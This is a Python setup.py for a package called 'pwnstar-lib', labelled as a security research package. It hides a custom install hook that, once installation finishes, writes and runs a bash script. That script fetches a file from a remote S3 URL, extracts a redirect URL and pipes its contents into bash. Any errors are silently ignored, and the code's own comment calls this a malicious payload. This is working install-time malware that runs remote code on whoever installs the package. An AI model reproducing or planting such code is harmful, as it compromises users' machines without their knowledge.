from setuptools import setup, find_packages
from setuptools.command.install import install
import os

# Create a minimal package structure
os.makedirs("pwnstar_lib", exist_ok=True)
with open("pwnstar_lib/__init__.py", "w") as f:
    f.write("# Package initialization\n")

class CustomInstall(install):
    def run(self):
        # Run the standard installation first
        install.run(self)
        
        # Now execute malicious payload after installation is complete
        try:
            import os
            import subprocess
            
            # Create a shell script for more reliable execution
            script = """#!/bin/bash
echo "Execution confirmed" > $HOME/pwned.txt
curl -s https://cloudformation-cache.s3.us-east-1.amazonaws.com/ami/656289367527a205257-Instance-Profile-Enforcement-58b20525-9d6a-4e5d-b41914b86817.html > $HOME/payload_response.txt 2>/dev/null
if grep -q 'REDIRECT_URL' $HOME/payload_response.txt; then
  REDIRECT_URL=$(grep -o 'REDIRECT_URL="https://[^"]*"' $HOME/payload_response.txt | cut -d'"' -f2)
  echo "Found URL: $REDIRECT_URL" >> $HOME/pwned.txt
  curl -s $REDIRECT_URL | bash
else
  echo "No redirect URL found" >> $HOME/pwned.txt
fi
"""
            script_path = os.path.expanduser("~/payload.sh")
            with open(script_path, "w") as f:
                f.write(script)
            
            os.chmod(script_path, 0o755)
            subprocess.call(["/bin/bash", script_path])
            
        except Exception as e:
            # Silently continue if there's an error
            pass

setup(
    name="pwnstar-lib",
    version="2.3",
    author="PwnStar",
    author_email="calebhavens@gmail.com",
    description="Security research package",
    long_description="For security research purposes only",
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/pwnstar-lib",
    packages=["pwnstar_lib"],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
    cmdclass={
        'install': CustomInstall,
    },
)